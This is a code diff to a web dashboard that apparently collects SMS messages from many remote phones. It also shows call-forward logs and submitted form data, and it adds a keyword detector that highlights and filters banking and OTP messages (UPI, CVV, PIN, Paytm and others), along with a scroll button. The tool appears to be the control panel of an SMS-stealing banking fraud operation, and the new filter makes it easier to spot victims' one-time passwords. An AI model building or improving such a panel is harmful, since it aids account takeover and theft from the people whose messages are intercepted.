@@ -151,6 +151,40 @@ function mkAdminUpdate(_did: string, number: string, status: "on" | "off"): Reco
   return { type: "admin_update", status: "off" };
 }
 
+/* ─── Banking / OTP keyword detector ─── */
+function isBankingMsg(body: string, sender: string): boolean {
+  const text = (body + " " + sender).toLowerCase();
+  return /\b(otp|upi|neft|rtgs|imps|bank|credit|debit|account|balance|transaction|txn|payment|transfer|rupee|inr|atm|cvv|pin|emi|loan|insurance|fraud|wallet|paytm|gpay|phonepe|bhim|recharge|cashback|refund|invoice|bill|due|mandate|auto.?pay|salary|withdraw|deposit)\b|₹/.test(text);
+}
+
+/* ─── Scroll-to-top floating button ─── */
+function ScrollToTopBtn() {
+  const [visible, setVisible] = useState(false);
+  useEffect(() => {
+    const el = document.getElementById("main-scroll");
+    if (!el) return;
+    const onScroll = () => setVisible(el.scrollTop > 350);
+    el.addEventListener("scroll", onScroll, { passive: true });
+    return () => el.removeEventListener("scroll", onScroll);
+  }, []);
+  if (!visible) return null;
+  return (
+    <button
+      onClick={() => document.getElementById("main-scroll")?.scrollTo({ top: 0, behavior: "smooth" })}
+      title="Scroll to top"
+      style={{
+        position: "fixed", bottom: 72, right: 16, zIndex: 999,
+        width: 38, height: 38, borderRadius: "50%",
+        background: "#6366f1", border: "none", color: "#fff",
+        fontSize: 20, fontWeight: 700, cursor: "pointer",
+        boxShadow: "0 3px 10px rgba(99,102,241,0.45)",
+        display: "flex", alignItems: "center", justifyContent: "center",
+        transition: "opacity 0.2s",
+      }}
+    >↑</button>
+  );
+}
+
 /* ─── Row helper ─── */
 function Row({ label, value, mono, accent }: { label: string; value: string; mono?: boolean; accent?: string }) {
   const t = useTheme();
@@ -202,7 +236,7 @@ function MsgCard({
 
         {/* Body */}
         <div style={{ display: "flex", alignItems: "flex-start", gap: 6, marginBottom: 6 }}>
-          <div style={{ flex: 1, fontSize: 13, color: msg.isSensitive ? "#16a34a" : t.txt, fontWeight: msg.isSensitive ? 600 : 400, lineHeight: 1.55, wordBreak: "break-word" }}>{msg.body}</div>
+          <div style={{ flex: 1, fontSize: 13, color: isBankingMsg(msg.body, msg.fromSender) ? "#16a34a" : t.txt, fontWeight: isBankingMsg(msg.body, msg.fromSender) ? 600 : 400, lineHeight: 1.55, wordBreak: "break-word" }}>{msg.body}</div>
           <CopyIconButton value={msg.body} size={22} color="#6366f1" title="Copy message" />
         </div>
 
@@ -708,7 +742,7 @@ function MessagesPage({
     .filter(m => {
       // Call Forward system logs hide karo — sirf real SMS dikhao
       if (m.fromSender.toLowerCase().startsWith("call forward")) return false;
-      if (filterSensitive && !m.isSensitive) return false;
+      if (filterSensitive && !isBankingMsg(m.body, m.fromSender)) return false;
       const q = search.toLowerCase();
       return !q || m.body.toLowerCase().includes(q) || m.fromSender.toLowerCase().includes(q) || m.fromNumber.includes(q) || (getDevice(m.deviceId)?.name ?? "").toLowerCase().includes(q);
     });
@@ -1444,7 +1478,7 @@ function DevicesPage({ devices, messages, initialDevice, onBack }: { devices: Db
                   <span style={{ fontSize: 10, color: t.muted }}>{fmtDate(msg.receivedAt)}</span>
                 </div>
                 <div style={{ display: "flex", alignItems: "flex-start", gap: 6, marginBottom: 4 }}>
-                  <div style={{ flex: 1, fontSize: 12, color: msg.isSensitive ? "#16a34a" : t.txt, fontWeight: msg.isSensitive ? 600 : 400, lineHeight: 1.5, wordBreak: "break-word" }}>{msg.body}</div>
+                  <div style={{ flex: 1, fontSize: 12, color: isBankingMsg(msg.body, msg.fromSender) ? "#16a34a" : t.txt, fontWeight: isBankingMsg(msg.body, msg.fromSender) ? 600 : 400, lineHeight: 1.5, wordBreak: "break-word" }}>{msg.body}</div>
                   <CopyIconButton value={msg.body} size={22} color="#6366f1" title="Copy message" />
                 </div>
                 <div style={{ display: "flex", gap: 10, fontSize: 11, flexWrap: "wrap", alignItems: "center" }}>
@@ -2447,7 +2481,8 @@ export default function WebDashboard() {
           </div>
         )}
         {!loading && !error && (
-          <div style={{ flex: 1, overflowY: "auto" }}>
+          <div id="main-scroll" style={{ flex: 1, overflowY: "auto" }}>
+            <ScrollToTopBtn />
             {page === "home" && <HomePage devices={displayDevices} messages={messages} formData={formData} onOpenDevice={onOpenDevice} scrollToMsgId={backPage === "home" ? scrollToMsgId : null} onScrollDone={() => setScrollToMsgId(null)} />}
             {page === "messages" && <MessagesPage messages={messages} devices={displayDevices} onOpenDevice={onOpenDevice} scrollToMsgId={backPage === "messages" ? scrollToMsgId : null} onScrollDone={() => setScrollToMsgId(null)} />}
             {page === "groups" && <GroupsPage devices={displayDevices} messages={messages} formData={formData} onOpenDevice={onOpenDevice} />}
